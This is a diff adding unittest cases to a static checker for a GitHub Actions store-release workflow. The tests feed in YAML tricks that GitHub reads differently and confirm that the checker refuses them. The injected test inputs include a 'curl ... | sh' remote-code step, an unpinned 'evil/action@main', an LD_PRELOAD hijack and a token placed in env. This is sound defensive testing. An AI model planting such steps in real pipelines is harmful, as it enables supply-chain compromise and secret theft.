@@ -441,6 +441,121 @@ class StaticCheckTests(unittest.TestCase):
         self.mutate(STORE, "    timeout-minutes: 30\n", "    timeout-minutes: 30\n    continue-on-error: true\n")
         self.assertFlagged("store android-release: a step other than the handoff download may fail")
 
+    def test_yaml_spellings_github_reads_differently_are_refused(self):
+        # Each is valid YAML that GitHub reads as a key or value the line rules would miss.
+        gate, sign = "      - id: gate\n", "      - name: Sign and verify Android App Bundle\n"
+        integrity = "      - name: Check the checkout is exactly its commit before decrypting\n"
+        hidden = ("        if: ${{ " + INERT + " && github.event.inputs.dry_run == 'false' }}\n")
+        cases = (
+            (gate, gate + '        "continue-on-error": true\n'),
+            (gate, gate + "        'if': false\n"),
+            (gate, gate + "        if : false\n"),
+            (gate, gate + "        ? if\n        : false\n"),
+            (gate, gate + "        continue-on-error : true\n"),
+            ("  admission:\n", "  admission:\n    \"if\": false\n"),
+            (sign, sign + '        "if": false\n'),
+            (integrity, integrity + "        if : false\n"),
+            (integrity, "      - name: x\n        \"run\": curl -s https://example.invalid | sh\n" + integrity),
+            (integrity, "      - \"uses\": evil/action@main\n" + integrity),
+            (integrity, "      - uses : evil/action@main\n" + integrity),
+            (sign, sign + "        env :\n          LD_PRELOAD: /tmp/x.so\n"),
+            # The guard kept only inside a multi-line quoted scalar: the upload has no if:.
+            (UPLOAD_LINE, "        id: \"upload\n" + hidden + "        \"\n"),
+            ("    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n    runs-on: macos-15\n",
+             "    name: \"ios build\n    if: ${{ " + INERT + " && inputs.platform == 'ios' }}\n    \"\n    runs-on: macos-15\n"),
+            (UPLOAD_LINE, "        if: &held ${{ " + INERT + " && github.event.inputs.dry_run == 'false' }}\n"),
+            ("permissions:\n  contents: read\nconcurrency:", "permissions:\n  contents: read\nrun-name: x\nconcurrency:"),
+        )
+        for old, new in cases:
+            with self.subTest(new=new.strip()[:60]):
+                self.fresh()
+                self.mutate(STORE, old, new)
+                if "run-name" in new:
+                    self.assertFlagged("top-level keys are not exactly name, on, permissions, concurrency, jobs")
+                else:
+                    self.assertLayoutFlagged()
+
+    def assertLayoutFlagged(self):
+        self.assertFlagged(": is not a plain one-line `key: value` in this repository's layout")
+
+    # One test per main layout rule, so each broken-build control has a single target.
+    def test_quoted_if_key_is_refused(self):
+        for old, new in (("  admission:\n", "  admission:\n    \"if\": false\n"),
+                         ("      - name: Sign and verify Android App Bundle\n",
+                          "      - name: Sign and verify Android App Bundle\n        \"if\": false\n")):
+            with self.subTest(new=new.strip()[:40]):
+                self.fresh()
+                self.mutate(STORE, old, new)
+                self.assertLayoutFlagged()
+
+    def test_spaced_continue_on_error_key_on_admission_is_refused(self):
+        self.mutate(STORE, "      - id: gate\n", "      - id: gate\n        continue-on-error : true\n")
+        self.assertLayoutFlagged()
+
+    def test_quoted_uses_key_with_an_unpinned_action_is_refused(self):
+        self.mutate(STORE, "      - name: Check the checkout is exactly its commit before decrypting\n",
+                    "      - \"uses\": evil/action@main\n"
+                    "      - name: Check the checkout is exactly its commit before decrypting\n")
+        self.assertLayoutFlagged()
+
+    def test_multiline_quoted_id_cannot_hide_an_if(self):
+        # GitHub reads one id "upload if: ... note: end" and an unconditional upload;
+        # the line rules alone would read the guarded if:.
+        self.mutate(STORE, UPLOAD_LINE, '        id: "upload\n' + UPLOAD_LINE + '        note: end"\n')
+        self.assertLayoutFlagged()
+
+    def test_extra_job_is_refused(self):
+        extra = ("  android-publish:\n    needs: [admission, android-release]\n    if: ${{ inputs.platform == 'android' }}\n"
+                 "    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n    steps:\n"
+                 "      - name: Publish\n        env:\n          MAY_DRY_RUN: 'false'\n"
+                 "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
+                 "        run: python3 -I -S -B tools/may_release/play_upload.py --target \"$MAY_TARGET\"\n")
+        self.mutate(STORE, "  ios-build:\n", extra + "  ios-build:\n")
+        self.assertFlagged("jobs are not exactly the ones stage 1 pins")
+
+    def test_extra_trigger_is_refused(self):
+        for trigger in ("  push:\n", "  pull_request:\n", "  workflow_call:\n"):
+            with self.subTest(trigger=trigger.strip()):
+                self.fresh()
+                self.mutate(STORE, "on:\n  workflow_dispatch:\n", "on:\n" + trigger + "  workflow_dispatch:\n")
+                self.assertFlagged("is triggered by something other than workflow_dispatch")
+
+    def test_admission_outputs_cannot_be_hardcoded(self):
+        for old, new in (("      environment: ${{ steps.gate.outputs.environment }}\n", "      environment: may-android-internal\n"),
+                         ("      build_environment: ${{ steps.gate.outputs.build_environment }}\n",
+                          "      build_environment: may-native-compile\n")):
+            with self.subTest(new=new.strip()):
+                self.fresh()
+                self.mutate(STORE, old, new)
+                self.assertFlagged("store admission: its actions, env or outputs are not exactly the gate's")
+
+    def test_store_workflow_has_exactly_its_jobs_and_trigger(self):
+        extra = ("  android-publish:\n    needs: [admission, android-release]\n    if: ${{ inputs.platform == 'android' }}\n"
+                 "    runs-on: ubuntu-24.04\n    environment: ${{ needs.admission.outputs.environment }}\n    steps:\n"
+                 "      - name: Publish\n        env:\n          MAY_DRY_RUN: 'false'\n"
+                 "          MAY_PLAY_JSON: ${{ secrets.MAY_PLAY_JSON }}\n"
+                 "        run: python3 -I -S -B tools/may_release/play_upload.py --target \"$MAY_TARGET\"\n")
+        self.mutate(STORE, "  ios-build:\n", extra + "  ios-build:\n")
+        self.assertFlagged("jobs are not exactly the ones stage 1 pins")
+        for trigger in ("  push:\n", "  pull_request:\n", "  workflow_call:\n"):
+            with self.subTest(trigger=trigger.strip()):
+                self.fresh()
+                self.mutate(STORE, "on:\n  workflow_dispatch:\n", "on:\n" + trigger + "  workflow_dispatch:\n")
+                self.assertFlagged("is triggered by something other than workflow_dispatch")
+
+    def test_admission_actions_env_and_outputs_are_pinned(self):
+        dry = "          MAY_DRY_RUN: ${{ github.event.inputs.dry_run }}\n"
+        for old, new in (("      - id: gate\n", "      - uses: someone/action@" + "a" * 40 + "\n      - id: gate\n"),
+                         (dry, dry + "          GITHUB_REF: refs/heads/main\n"),
+                         (dry, dry + "          MAY_X: ${{ github.token }}\n"),
+                         ("      - id: gate\n", "      - id: gatex\n"),
+                         ("      environment: ${{ steps.gate.outputs.environment }}\n",
+                          "      environment: may-android-internal\n")):
+            with self.subTest(new=new.strip()[:60]):
+                self.fresh()
+                self.mutate(STORE, old, new)
+                self.assertFlagged("store admission: its actions, env or outputs are not exactly the gate's")
+
     def test_dry_run_input_must_be_a_boolean_defaulting_to_true(self):
         for old, new in (("        type: boolean\n        default: true\n", "        type: boolean\n        default: false\n"),
                          ("        type: boolean\n        default: true\n", "        type: boolean\n"),
